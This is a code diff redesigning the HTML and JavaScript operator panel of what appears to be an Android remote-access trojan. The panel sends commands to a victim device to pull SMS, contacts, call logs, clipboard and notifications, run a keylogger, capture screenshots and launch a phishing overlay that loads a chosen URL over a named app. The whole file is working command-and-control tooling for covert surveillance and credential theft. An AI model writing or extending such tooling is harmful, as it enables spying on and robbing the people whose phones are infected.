@@ -1,306 +1,367 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Device Control</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: #0d0d0d;
-            color: #eee;
-            display: flex;
-            height: 100vh;
-        }
+  <meta charset="utf-8" />
+  <title>Device Control — Pro UI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root{
+      --bg-0:#041024;
+      --bg-1:#071827;
+      --panel:#0b2130;
+      --muted:#9fb0bd;
+      --accent-blue:#2b8cff;
+      --accent-green:#16a34a;
+      --danger:#ef4444;
+      --card:#071f29;
+      --glass: rgba(255,255,255,0.02);
+      --radius:12px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;color:var(--muted);background:linear-gradient(180deg,var(--bg-0) 0%, var(--bg-1) 100%); -webkit-font-smoothing:antialiased;}
+    .app { display:grid; grid-template-columns: 260px 1fr 72px; gap:18px; height:100vh; padding:18px; }
 
-        /* --- Sidebar --- */
-        .sidebar {
-            width: 70px;
-            background: #111;
-            padding: 20px 10px;
-            box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-            border-right: 1px solid #222;
-        }
+    /* Sidebar */
+    .sidebar { background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:var(--radius); padding:18px; border:1px solid rgba(255,255,255,0.03); display:flex; flex-direction:column; gap:12px; overflow:auto; }
+    .logo { color:var(--accent-blue); font-weight:800; font-size:18px; }
+    .meta { font-size:13px; color:#9fb0bd; margin-top:4px; }
+    .statusRow { display:flex; align-items:center; gap:8px; margin-top:8px; }
+    .badge { padding:6px 10px; border-radius:999px; font-weight:700; font-size:13px; }
+    .offline { background:rgba(255,255,255,0.03); color:#7ea2b9; }
+    .online { background: linear-gradient(90deg,#0ea5a4,#16a34a); color:white; }
 
-        .sidebar button {
-            width: 100%;
-            aspect-ratio: 1 / 1;
-            background: #1a1a1a;
-            border: none;
-            border-radius: 12px;
-            color: #ccc;
-            cursor: pointer;
-            font-size: 18px;
-            transition: 0.2s;
-        }
+    .groupTitle { margin-top:10px; font-size:12px; color:#7ea2b9; letter-spacing:1px; text-transform:uppercase; }
+    .actions { display:flex; flex-direction:column; gap:8px; margin-top:6px; }
 
-        .sidebar button:hover {
-            background: #3a3a3a;
-            color: #fff;
-        }
+    .btn {
+      background: transparent;
+      color:var(--muted);
+      border:1px solid rgba(255,255,255,0.03);
+      padding:10px 12px;
+      border-radius:10px;
+      font-weight:700;
+      cursor:pointer;
+      text-align:left;
+      transition:transform .08s ease, background .12s;
+    }
+    .btn:active{ transform: translateY(1px) }
+    .btn.blue{ background: linear-gradient(90deg,var(--accent-blue), #1e40af); color:white; border:none; }
+    .btn.green{ background: linear-gradient(90deg,var(--accent-green), #059669); color:white; border:none; }
+    .btn.ghost{ background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.03); }
+    .btn.danger{ background: linear-gradient(90deg,var(--danger), #c02626); color:white; border:none; }
 
-        /* --- Main Content --- */
-        .main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
+    .input { width:100%; padding:10px; border-radius:10px; border:1px solid rgba(255,255,255,0.03); background:rgba(255,255,255,0.02); color:var(--muted); font-size:14px; }
 
-        /* Tabs */
-        .tabs {
-            display: flex;
-            background: #111;
-            border-bottom: 1px solid #222;
-        }
+    /* Main area */
+    .main { display:flex; flex-direction:column; gap:14px; min-width:0; }
+    .header { display:flex; align-items:center; justify-content:space-between; padding:12px 16px; border-radius:12px; background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015)); border:1px solid rgba(255,255,255,0.02); }
+    .title { font-weight:800; color:#87c0ff; font-size:18px; }
+    .clientInfo { color:#a8c3d6; font-size:14px; }
+    .content { display:grid; grid-template-columns: 1fr 380px; gap:18px; align-items:start; min-height:0; }
 
-        .tab {
-            padding: 14px 20px;
-            cursor: pointer;
-            color: #999;
-            border-bottom: 2px solid transparent;
-            transition: 0.2s;
-        }
+    /* Card */
+    .card { background:var(--panel); border-radius:12px; padding:16px; border:1px solid rgba(255,255,255,0.02); min-height:420px; display:flex; flex-direction:column; gap:12px; min-width:0; }
+    .tabs { display:flex; gap:12px; align-items:center; }
+    .tab { padding:8px 12px; border-radius:999px; background:rgba(255,255,255,0.01); color:#9fb0bd; font-weight:700; cursor:pointer; }
+    .tab.active { background:linear-gradient(90deg,#183648,#0f3a4a); color:#bfe6ff; }
 
-        .tab.active {
-            color: #fff;
-            border-bottom: 2px solid #00adee;
-        }
+    #log { background:#071a21; border-radius:10px; padding:14px; height:520px; overflow:auto; font-family:monospace; color:#9fb0bd; font-size:13px; min-width:0; }
 
-        /* Panels */
-        .panel {
-            display: none;
-            padding: 20px;
-            overflow-y: auto;
-            flex: 1;
-        }
+    /* Screenshots column */
+    .shotsHeader { display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; }
+    .shotsGrid { display:grid; grid-template-columns:1fr; gap:12px; overflow:auto; max-height:620px; }
+    .shot { background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015)); padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,0.02); min-height:150px; display:flex; flex-direction:column; gap:8px; }
+    .shot img { width:100%; height:auto; border-radius:8px; object-fit:cover; cursor:zoom-in; display:block; }
 
-        .panel.active {
-            display: block;
-        }
+    /* Rail */
+    .rail { background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02)); border-radius:12px; padding:8px; display:flex; flex-direction:column; gap:12px; align-items:center; border:1px solid rgba(255,255,255,0.02); }
+    .icon { width:52px; height:52px; border-radius:10px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.02); cursor:pointer; }
 
-        /* Logs / SMS / Contacts / Etc. */
-        pre {
-            background: #1a1a1a;
-            padding: 15px;
-            border-radius: 10px;
-            white-space: pre-wrap;
-        }
-
-        /* Screenshot Grid */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 15px;
-        }
-
-        .grid img {
-            width: 100%;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .grid img:hover {
-            transform: scale(1.03);
-        }
-
-        /* Modal */
-        #imageModal {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 40px;
-            box-sizing: border-box;
-        }
-
-        #imageModal.show {
-            display: flex;
-        }
-
-        #imageModal img {
-            max-width: 90%;
-            max-height: 90%;
-            border-radius: 10px;
-        }
-
-        #modalClose {
-            position: absolute;
-            top: 20px;
-            right: 30px;
-            font-size: 26px;
-            cursor: pointer;
-            color: #fff;
-        }
-
-        #modalDownload {
-            position: absolute;
-            top: 20px;
-            right: 90px;
-            font-size: 20px;
-            padding: 8px 14px;
-            background: #00adee;
-            color: #fff;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-    </style>
+    /* Responsive */
+    @media (max-width: 1000px) {
+      .app { grid-template-columns: 1fr; grid-template-rows: auto 1fr auto; padding:12px; }
+      .rail { flex-direction:row; width:100%; justify-content:space-around; order:3; }
+      .content { grid-template-columns:1fr; }
+      #log { height:340px; }
+    }
+  </style>
 </head>
 <body>
-
-    <!-- ────────────────────────── SIDEBAR (Sidebar 1) ────────────────────────── -->
-    <div class="sidebar">
-        <button onclick="sendCmd('fetch-logs')">📄</button>
-        <button onclick="sendCmd('fetch-sms')">💬</button>
-        <button onclick="sendCmd('fetch-contacts')">👥</button>
-        <button onclick="sendCmd('fetch-calllogs')">📞</button>
-        <button onclick="sendCmd('fetch-apps')">📦</button>
-        <button onclick="sendCmd('take-screenshot')">📸</button>
-        <button onclick="sendCmd('overlay')">🟩</button>
-
-        <!-- Missing Old Buttons (Restored) -->
-        <button onclick="sendCmd('fetch-ip')">🌐</button>
-        <button onclick="sendCmd('fetch-clip')">📋</button>
-        <button onclick="sendCmd('start_keylog')">⏺</button>
-        <button onclick="sendCmd('stop_keylog')">⏹</button>
-        <button onclick="sendCmd('fetch_keylog')">⌨️</button>
-        <button onclick="window.close()">❌</button>
-    </div>
-
-    <!-- ────────────────────────── MAIN CONTENT ────────────────────────── -->
-    <div class="main">
-
-        <!-- Tabs -->
-        <div class="tabs">
-            <div class="tab active" data-panel="panelLogs">Logs</div>
-            <div class="tab" data-panel="panelSms">SMS</div>
-            <div class="tab" data-panel="panelContacts">Contacts</div>
-            <div class="tab" data-panel="panelCalls">Calls</div>
-            <div class="tab" data-panel="panelApps">Apps</div>
-            <div class="tab" data-panel="panelScreenshots">Screenshots</div>
+  <div class="app">
+    <!-- LEFT SIDEBAR -->
+    <aside class="sidebar" aria-label="left sidebar">
+      <div>
+        <div class="logo">Device</div>
+        <div class="meta">ID: <span id="devId">unknown</span></div>
+        <div class="statusRow">
+          <div id="status" class="badge offline">Offline</div>
         </div>
+      </div>
 
-        <!-- Panels -->
-        <div id="panelLogs" class="panel active"><pre id="logOutput">Waiting...</pre></div>
-        <div id="panelSms" class="panel"><pre id="smsOutput"></pre></div>
-        <div id="panelContacts" class="panel"><pre id="contactsOutput"></pre></div>
-        <div id="panelCalls" class="panel"><pre id="callsOutput"></pre></div>
-        <div id="panelApps" class="panel"><pre id="appsOutput"></pre></div>
-        <div id="panelScreenshots" class="panel">
-            <div id="screenshotGrid" class="grid"></div>
+      <div class="groupTitle">Notifications</div>
+      <div class="actions">
+        <button id="btnFetch" class="btn blue">Fetch Notification</button>
+        <button id="btnStartNotify" class="btn green">Start Notify</button>
+        <button id="btnStopNotify" class="btn ghost">Stop Notify</button>
+      </div>
+
+      <div class="groupTitle">Quick Actions</div>
+      <div class="actions">
+        <button id="btnFetchSms" class="btn">Fetch SMS</button>
+        <button id="btnFetchContact" class="btn">Fetch Contacts</button>
+        <button id="btnFetchLog" class="btn">Fetch Calls</button>
+        <button id="btnFetchApps" class="btn">Fetch Apps</button>
+        <button id="btnFetchIp" class="btn">Fetch IP</button>
+        <button id="btnFetchClip" class="btn">Fetch Clipboard</button>
+      </div>
+
+      <div class="groupTitle">Keylogger</div>
+      <div class="actions">
+        <button id="btnStartKeyLog" class="btn">Start KeyLogs</button>
+        <button id="btnStopKeyLog" class="btn ghost">Stop KeyLogs</button>
+        <button id="btnFetchKeyLog" class="btn">Fetch KeyLogs</button>
+      </div>
+
+      <div class="groupTitle">Device</div>
+      <div class="actions">
+        <button id="btnFetchDevice" class="btn">Device Info</button>
+        <button id="btnFetchScreenshot" class="btn">Fetch Screenshot</button>
+        <button id="btnFetchScreenshotPermission" class="btn">Screenshot Permission</button>
+      </div>
+
+      <div class="groupTitle">Overlay</div>
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <input id="pkgInput" class="input" placeholder="com.example.app" />
+        <input id="urlInput" class="input" placeholder="https://..." />
+        <div style="display:flex;gap:8px;">
+          <button id="btnCustomOverlay" class="btn blue" style="flex:1;">Start Overlay</button>
+          <button id="btnStopOverlay" class="btn ghost" style="flex:1;">Stop Overlay</button>
         </div>
+      </div>
 
-    </div>
+      <div style="margin-top:auto; display:flex; flex-direction:column; gap:8px;">
+        <button id="btnUpload" class="btn blue">Upload</button>
+        <button id="btnClose" class="btn danger">Close</button>
+      </div>
+    </aside>
 
-    <!-- ────────────────────────── IMAGE MODAL ────────────────────────── -->
-    <div id="imageModal">
-        <span id="modalClose">✖</span>
-        <span id="modalDownload">Download</span>
-        <img id="modalImage" src="">
-    </div>
+    <!-- MAIN -->
+    <main class="main">
+      <div class="header">
+        <div>
+          <div class="title">Live Device Console</div>
+          <div class="clientInfo">Client: <span id="devName">unknown</span></div>
+        </div>
+        <div style="display:flex;align-items:center;gap:12px;">
+          <div style="font-size:13px;color:#90b1c6">Status</div>
+          <div id="statusSmall" class="badge offline">Offline</div>
+        </div>
+      </div>
 
-<script>
-/* ─────────────────────────────────────────────
-     WORKING WEBSOCKET (FROM YOUR OLD VERSION)
-   ───────────────────────────────────────────── */
-const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
-const ws = new WebSocket(wsProto + location.host);
+      <div class="content">
+        <!-- Left: logs & tabs -->
+        <section class="card" aria-labelledby="logs">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <div class="tabs" role="tablist" aria-label="device tabs">
+              <div class="tab active" role="tab">Logs</div>
+              <div class="tab" role="tab">SMS</div>
+              <div class="tab" role="tab">Contacts</div>
+              <div class="tab" role="tab">Calls</div>
+              <div class="tab" role="tab">Apps</div>
+              <div class="tab" role="tab">Screenshots</div>
+            </div>
+            <div style="font-size:13px;color:#7ea2b9">Live</div>
+          </div>
 
-/* Send Command */
-function sendCmd(cmd) {
-    ws.send(JSON.stringify({ cmd }));
-}
+          <div id="log" aria-live="polite" role="log">Connecting...</div>
+        </section>
 
-/* Switch Tabs */
-document.querySelectorAll(".tab").forEach(t => {
-    t.onclick = () => {
-        document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
-        document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));
+        <!-- Right: screenshots -->
+        <aside class="card" aria-label="screenshots">
+          <div class="shotsHeader">
+            <div style="font-weight:700;color:#dbefff">Screenshots</div>
+            <div style="font-size:13px;color:#7ea2b9">Auto saved</div>
+          </div>
 
-        t.classList.add("active");
-        document.getElementById(t.dataset.panel).classList.add("active");
-    };
-});
+          <div id="screenshotsContainer" class="shotsGrid"></div>
+        </aside>
+      </div>
+    </main>
 
-/* WebSocket Events */
-ws.onopen = () => {
-    console.log("Connected to server.");
-};
+    <!-- RIGHT RAIL -->
+    <nav class="rail" aria-hidden="true">
+      <div class="icon" title="Logs"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M4 7h16v2H4zM4 11h10v2H4zM4 15h16v2H4z" fill="currentColor"/></svg></div>
+      <div class="icon" title="Calls"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.57.57a1 1 0 011 1V20a1 1 0 01-1 1C10.07 21 3 13.93 3 5a1 1 0 011-1h3.5a1 1 0 011 1c0 1.24.2 2.45.57 3.57a1 1 0 01-.24 1.01l-2.21 2.21z" fill="currentColor"/></svg></div>
+      <div class="icon" title="Contacts"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zM4 22a8 8 0 0116 0H4z" fill="currentColor"/></svg></div>
+      <div class="icon" title="Apps"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M3 3h8v8H3zM13 3h8v8h-8zM3 13h8v8H3zM13 13h8v8h-8z" fill="currentColor"/></svg></div>
+      <div class="icon" title="Screenshot"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M5 7h14l-1 12H6zM12 3l2 3h-4l2-3z" fill="currentColor"/></svg></div>
+      <div class="icon" title="Info"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M11 17h2v-6h-2v6zm0-8h2V7h-2v2zM12 2a10 10 0 100 20 10 10 0 000-20z" fill="currentColor"/></svg></div>
+    </nav>
+  </div>
 
-ws.onmessage = (event) => {
-    try {
-        const data = JSON.parse(event.data);
+  <script>
+    // --- device info extraction ---
+    const pathParts = window.location.pathname.split('/');
+    const clientId = pathParts[pathParts.length - 1] || 'unknown';
+    const urlParams = new URLSearchParams(location.search);
+    const deviceName = decodeURIComponent(urlParams.get('name') || clientId);
 
-        if (data.logs) {
-            logOutput.textContent = data.logs;
-        }
-        if (data.sms) {
-            smsOutput.textContent = JSON.stringify(data.sms, null, 2);
-        }
-        if (data.contacts) {
-            contactsOutput.textContent = JSON.stringify(data.contacts, null, 2);
-        }
-        if (data.calls) {
-            callsOutput.textContent = JSON.stringify(data.calls, null, 2);
-        }
-        if (data.apps) {
-            appsOutput.textContent = JSON.stringify(data.apps, null, 2);
-        }
+    document.title = deviceName + ' — Live Device Console';
+    document.getElementById('devName').textContent = deviceName;
+    document.getElementById('devId').textContent = clientId;
 
-        /* Screenshot Handler */
-        if (data.screenshot) {
-            addScreenshot(data.screenshot);
-        }
+    // --- elements ---
+    const logEl = document.getElementById('log');
+    const statusEl = document.getElementById('status');
+    const statusSmallEl = document.getElementById('statusSmall');
+    const screenshotsContainer = document.getElementById('screenshotsContainer');
 
-    } catch (e) {
-        console.error("Invalid WS message:", event.data);
+    // --- logging helper ---
+    function pushLog(msg){
+      const ts = new Date().toLocaleTimeString();
+      logEl.textContent += `\n[${ts}] ${msg}`;
+      logEl.scrollTop = logEl.scrollHeight;
     }
-};
 
-/* Screenshot rendering */
-function addScreenshot(url) {
-    const grid = document.getElementById("screenshotGrid");
-    const img = document.createElement("img");
-    img.src = url;
-    img.onclick = () => openModal(url);
-    grid.prepend(img);
-}
+    // --- send command helper ---
+    async function sendCmd(cmd){
+      pushLog(`📤 Sending "${cmd}"...`);
+      try{
+        const r = await fetch('/command', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ targetClientId: clientId, command: cmd })
+        });
+        if(!r.ok) pushLog(`❌ Failed: ${r.status}`);
+        else pushLog(`✅ Command sent (${cmd})`);
+      }catch(e){
+        pushLog(`⚠️ Network error: ${e.message}`);
+      }
+    }
 
-/* Modal */
-function openModal(url) {
-    const modal = document.getElementById("imageModal");
-    const img = document.getElementById("modalImage");
-    const dl = document.getElementById("modalDownload");
+    // --- bind buttons (map) ---
+    const map = {
+      btnFetch: 'fetch',
+      btnStartNotify: 'start-notify',
+      btnStopNotify: 'stop-notify',
+      btnFetchSms: 'fetch-sms',
+      btnFetchContact: 'fetch-contact',
+      btnFetchLog: 'fetch-logs',
+      btnFetchApps: 'fetch-apps',
+      btnFetchIp: 'fetch-ip',
+      btnFetchClip: 'fetch-clip',
+      btnStartKeyLog: 'start_keylog',
+      btnStopKeyLog: 'stop_keylog',
+      btnFetchKeyLog: 'fetch_keylog',
+      btnFetchDevice: 'fetch-device',
+      btnFetchScreenshot: 'fetch-screenshot',
+      btnFetchScreenshotPermission: 'grant-screenshot-permission',
+      btnUpload: 'upload'
+    };
+    Object.keys(map).forEach(id => {
+      const el = document.getElementById(id);
+      if(el) el.addEventListener('click', ()=> sendCmd(map[id]));
+    });
 
-    img.src = url;
-    dl.onclick = () => downloadImage(url);
+    document.getElementById('btnCustomOverlay')?.addEventListener('click', ()=>{
+      const pkg = document.getElementById('pkgInput').value.trim();
+      const url = document.getElementById('urlInput').value.trim();
+      if(!pkg || !url){ pushLog('⚠️ Please enter both PackageName and URL'); return; }
+      const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
+      sendCmd(cmd);
+    });
+    document.getElementById('btnStopOverlay')?.addEventListener('click', ()=> sendCmd('stop-overlay'));
+    document.getElementById('btnClose')?.addEventListener('click', ()=> window.close());
 
-    modal.classList.add("show");
-}
+    // --- WebSocket live updates ---
+    const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
+    let ws;
+    try { ws = new WebSocket(wsProto + location.host); }
+    catch(e) { pushLog('⚠️ WS init error: ' + e.message); }
 
-function downloadImage(url) {
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "screenshot.png";
-    a.click();
-}
+    if(ws){
+      ws.onopen = () => pushLog('🔌 WebSocket connected');
+      ws.onclose = () => pushLog('❌ WebSocket disconnected');
+      ws.onerror = (e) => pushLog('⚠️ WebSocket error');
 
-document.getElementById("modalClose").onclick = () => {
-    const modal = document.getElementById("imageModal");
-    const img = document.getElementById("modalImage");
-    const dl = document.getElementById("modalDownload");
+      ws.onmessage = (evt) => {
+        try {
+          const msg = JSON.parse(evt.data);
 
-    modal.classList.remove("show");
-    img.src = "";
-    dl.onclick = null;
-};
-</script>
+          if(msg.type === 'devices'){
+            const d = msg.devices && msg.devices[clientId];
+            if(d && d.online){
+              statusEl.textContent = 'Online';
+              statusEl.className = 'badge online';
+              statusSmallEl.textContent = 'Online';
+              statusSmallEl.className = 'badge online';
+            } else {
+              statusEl.textContent = 'Offline';
+              statusEl.className = 'badge offline';
+              statusSmallEl.textContent = 'Offline';
+              statusSmallEl.className = 'badge offline';
+            }
+          }
 
+          if(msg.type === 'response' && msg.clientId === clientId){
+            pushLog(`📩 Response: ${msg.output}`);
+
+            // screenshots (supabase link)
+            if(typeof msg.output === 'string' && msg.output.includes('supabase.co')){
+              const url = msg.output.trim();
+              appendScreenshot(url);
+            }
+          }
+        } catch(e){
+          console.error('WS parse error', e);
+        }
+      };
+    }
+
+    // --- append screenshot UI ---
+    function appendScreenshot(url){
+      const item = document.createElement('div'); item.className = 'shot';
+      const d = new Date();
+      const stampDisplay = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`;
+      const stampFile = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;
+
+      const label = document.createElement('div'); label.className = 'meta'; label.innerText = `Captured: ${stampDisplay}`;
+      const img = document.createElement('img'); img.src = url; img.alt = 'screenshot';
+      img.addEventListener('click', ()=> {
+        const win = window.open('', '_blank');
+        win.document.write(`<html><head><title>Screenshot</title></head><body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;"><img src="${url}" style="max-width:100%;height:auto" /></body></html>`);
+      });
+
+      const actions = document.createElement('div'); actions.style.display='flex'; actions.style.gap='8px';
+      const dl = document.createElement('button'); dl.className='btn ghost'; dl.innerText='Download';
+      dl.addEventListener('click', async ()=>{
+        try{
+          const res = await fetch(url);
+          const blob = await res.blob();
+          const blobUrl = URL.createObjectURL(blob);
+          const link = document.createElement('a');
+          link.href = blobUrl;
+          link.download = `screenshot_${stampFile}.jpg`;
+          document.body.appendChild(link);
+          link.click();
+          link.remove();
+          URL.revokeObjectURL(blobUrl);
+        }catch(e){
+          pushLog('⚠️ Download failed: ' + e.message);
+        }
+      });
+
+      actions.appendChild(dl);
+      item.appendChild(label);
+      item.appendChild(img);
+      item.appendChild(actions);
+
+      // newest first
+      screenshotsContainer.prepend(item);
+    }
+
+    // expose pushRemoteLog for external scripts
+    window.pushRemoteLog = pushLog;
+  </script>
 </body>
 </html>
